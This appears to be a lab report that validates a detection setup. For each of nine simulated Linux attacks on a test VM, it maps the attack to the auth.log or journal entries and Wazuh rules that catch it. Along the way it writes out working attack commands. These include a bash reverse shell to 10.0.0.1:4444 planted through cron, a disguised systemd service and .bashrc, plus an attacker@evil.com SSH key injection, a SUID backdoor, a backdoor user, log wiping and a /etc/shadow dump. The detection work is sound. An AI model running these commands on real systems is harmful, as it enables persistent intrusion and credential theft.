# ABSEGA Attack Validation — Log Evidence

This document records each attack simulation, where the logs appeared, and a step-by-step breakdown of the captured log entries.

---

## Attack #1: SSH Brute Force

### What the Attack Does

Attempts to log in via SSH from a remote host (WSL at `192.168.36.2`) to the target VM (`192.168.36.128`) using 5 different wrong passwords against the same user (`ubuntu`). This simulates an attacker trying to brute force a specific account over the network.

**Target user:** `ubuntu`
**Passwords attempted:** `password`, `123456`, `admin123`, `letmein`, `ubuntu123` (all incorrect)

### Where the Logs Appear

**Log file:** `/var/log/auth.log` on the target VM
**How to check:** `sudo grep --text "Failed password for ubuntu" /var/log/auth.log | tail -5`
**Alternative:** `journalctl -t sshd`

### Captured Log Evidence

Each failed SSH login attempt generates 2 log entries:

#### Step 1 — PAM authentication failure

```
Jul 15 12:46:02 wazuh-server sshd[13490]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.36.2  user=ubuntu
Jul 15 12:46:05 wazuh-server sshd[13492]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.36.2  user=ubuntu
Jul 15 12:46:09 wazuh-server sshd[13494]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.36.2  user=ubuntu
Jul 15 12:46:12 wazuh-server sshd[13496]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.36.2  user=ubuntu
Jul 15 12:46:15 wazuh-server sshd[13504]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.36.2  user=ubuntu
```

PAM (Pluggable Authentication Module) logs each failure. Key fields:
- `rhost=192.168.36.2` — the remote attacker's IP
- `user=ubuntu` — the targeted account
- `tty=ssh` — confirms this is a remote SSH attempt, not a local login

#### Step 2 — Failed password verdict

```
2026-07-15T12:46:05.128943+03:00 wazuh-server sshd[13490]: Failed password for ubuntu from 192.168.36.2 port 44868 ssh2
2026-07-15T12:46:07.431307+03:00 wazuh-server sshd[13492]: Failed password for ubuntu from 192.168.36.2 port 44878 ssh2
2026-07-15T12:46:11.319991+03:00 wazuh-server sshd[13494]: Failed password for ubuntu from 192.168.36.2 port 44894 ssh2
2026-07-15T12:46:14.400888+03:00 wazuh-server sshd[13496]: Failed password for ubuntu from 192.168.36.2 port 48222 ssh2
2026-07-15T12:46:17.477411+03:00 wazuh-server sshd[13504]: Failed password for ubuntu from 192.168.36.2 port 48226 ssh2
```

The final verdict from sshd — the password was wrong. Since `ubuntu` is a valid user on the system, the format is `Failed password for ubuntu` (not "invalid user"). Each attempt comes from a different source port, showing 5 separate SSH connections.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 5503 | PAM: User login failed | `Failed password for ubuntu` (existing user) |
| 5551 | Multiple failed authentications | 5 failures against the same user in a short window → brute force alert |

---

## Attack #2: Cron Job Persistence

### What the Attack Does

Simulates an attacker establishing persistence by planting a malicious cron job. The attack does two things:

1. **Writes a reverse shell cron file** to `/tmp/absega_test/fake_cron/malicious` containing `* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` — a classic reverse shell that would execute every minute.
2. **Modifies the real user crontab** by appending a marker comment via `crontab -`, which triggers the cron daemon to reload.

This mimics how real attackers drop persistent backdoors that survive reboots and re-execute on a schedule.

### Where the Logs Appear

**Log source:** `journalctl -t crontab` and `journalctl -t cron` on the target VM
**How to check crontab modifications:** `journalctl -t crontab --since "5 minutes ago"`
**How to check cron reloads:** `journalctl -t cron --since "5 minutes ago"`
**File artifact:** `cat /tmp/absega_test/fake_cron/malicious`

> Note: On this system, cron logs go to the systemd journal rather than `/var/log/auth.log` or `/var/log/syslog`.

### Captured Log Evidence

#### Step 1 — Crontab LIST and REPLACE operations

```
Jul 15 13:47:52 wazuh-server crontab[14865]: (ubuntu) LIST (ubuntu)
Jul 15 13:47:52 wazuh-server crontab[14864]: (ubuntu) REPLACE (ubuntu)
Jul 15 13:47:52 wazuh-server crontab[14866]: (ubuntu) LIST (ubuntu)
Jul 15 13:47:52 wazuh-server crontab[14868]: (ubuntu) LIST (ubuntu)
Jul 15 13:47:52 wazuh-server crontab[14870]: (ubuntu) REPLACE (ubuntu)
```

The `crontab` command logs every operation:
- **`LIST (ubuntu)`** — the attack reads the existing crontab with `crontab -l` before modifying it (3 reads: once to append the marker, once to verify, once to clean up)
- **`REPLACE (ubuntu)`** — the attack writes a new crontab via `crontab -` (2 writes: once to add the marker, once to remove it during cleanup)
- All entries show user `ubuntu` modifying their own crontab

#### Step 2 — Cron daemon detects the change and reloads

```
Jul 15 13:48:01 wazuh-server cron[1267]: (ubuntu) RELOAD (crontabs/ubuntu)
```

The cron daemon (`cron[1267]`) detects that `ubuntu`'s crontab file was modified and reloads it. This confirms the persistence mechanism would be active — any malicious entry in the crontab would now be scheduled for execution.

#### Step 3 — Malicious file artifact on disk

```
$ cat /tmp/absega_test/fake_cron/malicious
* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

The reverse shell cron entry was written to disk. In a real attack, this file could be placed in `/etc/cron.d/` or injected directly into the user's crontab to execute every minute.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 2834 | Crontab entry changed | Detects `REPLACE` operations logged by crontab |
| 2833 | Crontab listing | Detects `LIST` operations on crontab |
| 2831 | Cron daemon reload | Detects `RELOAD` events from the cron daemon |

---

## Attack #3: SUID Binary Abuse

### What the Attack Does

On Linux, the SUID (Set User ID) bit is a special permission — when set on a program, anyone who runs it temporarily gets the owner's privileges instead of their own. An attacker can copy a normal system tool, set the SUID bit on the copy, and use it as a backdoor for privilege escalation.

**Attack commands:**
```bash
cp /usr/bin/find /tmp/absega_test/suid_find
sudo chmod u+s /tmp/absega_test/suid_find
```

**Before:** `-rwxr-xr-x` (normal permissions)
**After:** `-rwsr-xr-x` (the `s` = SUID bit is active — anyone can now run this binary with elevated privileges)

### Where the Logs Appear

**Log file:** `/var/log/auth.log` on the target VM
**How to check:** `sudo grep --text "chmod" /var/log/auth.log | tail -5`

### Captured Log Evidence

#### Step 1 — sudo logs the SUID chmod command

```
2026-07-15T14:07:43.805036+03:00 wazuh-server sudo:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/chmod u+s /tmp/absega_test/suid_find
```

This is the core evidence of the attack:
- **`sudo:`** — the log comes from the sudo subsystem, meaning a privileged command was executed
- **`ubuntu`** — the user who ran the command
- **`USER=root`** — sudo elevated to root to execute it
- **`COMMAND=/usr/bin/chmod u+s /tmp/absega_test/suid_find`** — the exact privilege escalation command, setting the SUID bit (`u+s`) on the copied binary
- **No `TTY=` field** — the command was executed over a remote SSH session (automated), not from an interactive terminal — a red flag for defenders

#### Step 2 — Contrast with legitimate interactive command

```
2026-07-15T14:08:48.417567+03:00 wazuh-server sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/grep --text chmod /var/log/auth.log
```

This is the verification command run from the VM console. Notice **`TTY=pts/0`** is present — a real terminal session. The attack logs have no TTY, which is a key difference defenders can use to distinguish automated/remote attacks from legitimate admin activity.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 5402 | Successful sudo to ROOT executed | `sudo` command executed as root — catches `chmod u+s` |
| 5551 | Multiple failed authentications | If sudo auth fails before succeeding |

---

## Attack #4: Unauthorized User Creation

### What the Attack Does

The attacker creates a new user account on the system as a backdoor. Even if the defender resets passwords or patches the vulnerability that got the attacker in, the attacker can still log in through the account they created. It's like making a spare key to someone's house.

**Attack commands:**
```bash
sudo useradd -m -s /bin/bash hacker_7a076b
```
This creates a new user called `hacker_7a076b` with a home directory (`-m`) and a bash shell (`-s /bin/bash`).

### Where the Logs Appear

**Log file:** `/var/log/auth.log` on the target VM
**How to check:** `sudo grep --text "useradd\|new user" /var/log/auth.log | tail -5`

### Captured Log Evidence

#### Log 1 — sudo records the useradd command

```
2026-07-15T14:15:42.979085+03:00 wazuh-server sudo:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash hacker_7a076b
```

- **`sudo:`** — a privileged command was executed
- **`ubuntu`** — the user who ran it
- **`USER=root`** — sudo elevated to root
- **`COMMAND=/usr/sbin/useradd -m -s /bin/bash hacker_7a076b`** — the exact command that created the backdoor user
- **No `TTY=`** — ran over a remote SSH session (automated), not an interactive terminal

#### Log 2 — useradd confirms the new group was created

```
2026-07-15T14:15:42.999308+03:00 wazuh-server useradd[15823]: new group: name=hacker_7a076b, GID=1001
```

Linux automatically creates a matching group for each new user. This log comes from `useradd` itself (not sudo), confirming the group was created with GID 1001.

#### Log 3 — useradd confirms the new user was created

```
2026-07-15T14:15:42.999425+03:00 wazuh-server useradd[15823]: new user: name=hacker_7a076b, UID=1001, GID=1001, home=/home/hacker_7a076b, shell=/bin/bash, from=none
```

The full record of the new account:
- **`name=hacker_7a076b`** — the username
- **`UID=1001`** — the user ID assigned
- **`home=/home/hacker_7a076b`** — the home directory that was created
- **`shell=/bin/bash`** — the user has a full bash shell (can run commands)
- **`from=none`** — no terminal was used (remote/automated)

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 5901 | New user added | Detects `useradd` creating a new account |
| 5902 | New group added | Detects new group creation |
| 5402 | Successful sudo to ROOT | Catches the `sudo useradd` command |

---

## Attack #5: SSH Key Injection

### What the Attack Does

SSH keys let you log into a server without a password. Every user has a file called `~/.ssh/authorized_keys` that lists which keys are allowed in. The attacker writes their own key into this file, giving themselves password-free access anytime. Even if the user changes their password, the attacker's key still works.

**Attack command:**
```bash
echo "ssh-rsa AAAAB3FAKEKEYATTACKERINJECTED== attacker@evil.com" >> ~/.ssh/authorized_keys
```
The `>>` appends the key without removing existing ones, so the legitimate user doesn't notice anything changed.

### Where the Logs Appear

**No traditional logs.** Writing to a file doesn't generate entries in auth.log or syslog. This is what makes this attack dangerous — it's completely silent.

**How to verify the attack happened:**
```bash
cat ~/.ssh/authorized_keys
```
You'll see the attacker's key (`attacker@evil.com`) at the end of the file.

**How a SIEM would detect this:** Only through **File Integrity Monitoring (FIM)** — Wazuh can be configured to watch `~/.ssh/authorized_keys` for changes. Without FIM, this attack is invisible.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 550 | FIM: File modified | Detects changes to monitored files (if FIM watches `authorized_keys`) |

---

## Attack #6: Systemd Backdoor

### What the Attack Does

Systemd manages services (programs) that start automatically when the system boots. The attacker creates a fake service file called `system-health-monitor.service` that looks legitimate but actually runs a reverse shell — a connection back to the attacker's machine. Since systemd services start on boot, the attacker gets automatic access every time the server restarts.

**Attack commands:**
```bash
# Write the malicious service file
cat > /tmp/backdoor.service << EOF
[Unit]
Description=System Health Monitor
After=network.target

[Service]
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Copy it into systemd's directory and reload
sudo cp /tmp/backdoor.service /etc/systemd/system/system-health-monitor.service
sudo systemctl daemon-reload
```

### Where the Logs Appear

**Log file:** `/var/log/auth.log` on the target VM
**How to check:** `sudo grep --text "system-health\|daemon-reload" /var/log/auth.log | tail -5`

### Captured Log Evidence

#### Log 1 — sudo records the service file being copied

```
2026-07-15T14:15:46.957879+03:00 wazuh-server sudo:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cp /tmp/absega_test/fake_systemd/backdoor.service /etc/systemd/system/system-health-monitor.service
```

- **`COMMAND=/usr/bin/cp ... /etc/systemd/system/system-health-monitor.service`** — this is the key evidence. A file is being copied into the systemd service directory. Any new service file appearing here is suspicious if it wasn't part of a planned deployment.
- **No `TTY=`** — automated/remote execution, not interactive

#### Log 2 — sudo records the daemon reload

```
2026-07-15T14:15:47.026123+03:00 wazuh-server sudo:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl daemon-reload
```

- **`systemctl daemon-reload`** — tells systemd to re-read all service files. This means the attacker's backdoor service is now registered and ready to start. A `daemon-reload` outside of a deployment or package install is suspicious.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 5402 | Successful sudo to ROOT | Catches the `sudo cp` and `sudo systemctl` commands |

---

## Attack #7: Bashrc Persistence

### What the Attack Does

Every Linux user has a hidden file called `~/.bashrc` that runs automatically every time they open a terminal or log in via SSH. It's normally used for harmless settings like colors and shortcuts. The attacker injects a malicious command into this file — now every time the user opens a terminal, the attacker's command runs silently in the background.

**Attack command:**
```bash
echo "# ABSEGA_TEST: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc
```

### Where the Logs Appear

**No traditional logs.** Like SSH Key Injection, writing to a file doesn't generate log entries. This attack is silent.

**How to verify the attack happened:**
```bash
tail -3 ~/.bashrc
```
You'll see the injected reverse shell line at the end.

**How a SIEM would detect this:** Only through **File Integrity Monitoring (FIM)** if configured to watch `~/.bashrc`. Without FIM, this attack is invisible to defenders.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 550 | FIM: File modified | Detects changes to monitored files (if FIM watches `.bashrc`) |

---

## Attack #8: Log Tampering

### What the Attack Does

After breaking in, the attacker tries to erase or modify log files to cover their tracks. If they can wipe `/var/log/auth.log`, defenders won't see evidence of the earlier attacks. This is why forwarding logs to a remote SIEM (like Wazuh) in real-time is critical — logs that already left the machine can't be tampered with.

**Attack commands:**
```bash
sudo truncate -s 0 /tmp/absega_test/fake_logs/auth.log    # wipe a log file
sudo sed -i "/ABSEGA/d" /var/log/auth.log                  # delete specific lines from real auth.log
```

### Where the Logs Appear

**Log file:** `/var/log/auth.log` on the target VM
**How to check:** `sudo grep --text "truncate\|sed" /var/log/auth.log | tail -5`

### Captured Log Evidence

#### Log 1 — sudo records the truncate command

```
2026-07-15T14:31:37.637258+03:00 wazuh-server sudo:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /tmp/absega_test/fake_logs/auth.log
```

- **`COMMAND=/usr/bin/truncate -s 0`** — truncate sets a file's size to 0 bytes, effectively wiping it clean. Any `truncate` on a log file is a major red flag.
- The irony: the tampering command itself gets logged by sudo before the log is modified.

#### Real-world finding: log tampering broke the logging pipeline

When we ran `sed -i` on the real `/var/log/auth.log`, it rewrote the entire file. This broke rsyslog's file handle — **all logging to auth.log stopped after that point**. Attack #9 (Credential Dumping) ran right after, but its logs never appeared in auth.log. They were only visible in `journalctl`.

This is exactly what happens in real attacks: log tampering doesn't just hide evidence — it can **blind the entire logging system**. This is why:
- Logs should be forwarded to a remote SIEM in real-time
- Log integrity should be monitored (did auth.log suddenly stop receiving entries?)
- The systemd journal (`journalctl`) serves as a backup since it's a separate system

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 5402 | Successful sudo to ROOT | Catches `sudo truncate` and `sudo sed` commands |
| 591 | Log file cleared | Detects when a log file size drops to zero |

---

## Attack #9: Credential Dumping

### What the Attack Does

Linux stores user account info in two files:
- `/etc/passwd` — usernames, user IDs, home directories (readable by everyone)
- `/etc/shadow` — the actual password hashes (only readable by root)

The attacker uses root access to read `/etc/shadow` and copy it. They can then take the password hashes offline and crack them using tools like hashcat or john. Since people reuse passwords, cracking one password can give the attacker access to other systems.

**Attack commands:**
```bash
cat /etc/passwd                                    # read user list (no sudo needed)
sudo cat /etc/shadow                               # read password hashes (needs root)
sudo cp /etc/shadow /tmp/absega_test/shadow_dump   # copy for offline cracking
```

### Where the Logs Appear

**Log file:** `journalctl -t sudo` on the target VM (auth.log was broken by Attack #8)
**How to check:** `journalctl -t sudo --since "1 hour ago" | grep shadow`

### Captured Log Evidence

#### Log 1 — sudo records reading the shadow file

```
Jul 15 14:31:37 wazuh-server sudo[16289]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```

- **`COMMAND=/usr/bin/cat /etc/shadow`** — the attacker is reading the password hash file. Any access to `/etc/shadow` outside of normal system operations is suspicious.

#### Log 2 — sudo records copying the shadow file

```
Jul 15 14:31:37 wazuh-server sudo[16293]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cp /etc/shadow /tmp/absega_test/shadow_dump
```

- **`COMMAND=/usr/bin/cp /etc/shadow /tmp/absega_test/shadow_dump`** — the attacker is copying the shadow file to a temp location. This is the exfiltration step — they'll transfer this file to their own machine and crack the passwords offline.
- Both commands happened at the **same second** (`14:31:37`), showing this was automated/scripted, not a human typing.

#### Note: these logs were only in journalctl

These logs did **not** appear in `/var/log/auth.log` because Attack #8 (Log Tampering) broke the auth.log pipeline. This demonstrates how log tampering can hide subsequent attacks. The systemd journal (`journalctl`) saved us because it's a separate logging system.

### Wazuh Detection Rules

| Rule ID | Rule Name | What It Matches |
|---------|-----------|-----------------|
| 5402 | Successful sudo to ROOT | Catches `sudo cat /etc/shadow` and `sudo cp` commands |

---

## Attack #10: Sudoers Modification

*(Pending — will be documented after testing)*

---

## Attack #11: Hosts File Modification

*(Pending — will be documented after testing)*

---

## Attack #12: Firewall Tampering

*(Pending — will be documented after testing)*

---

## Attack #13: System Reconnaissance

*(Pending — will be documented after testing)*

---

## Attack #14: Data Exfiltration

*(Pending — will be documented after testing)*
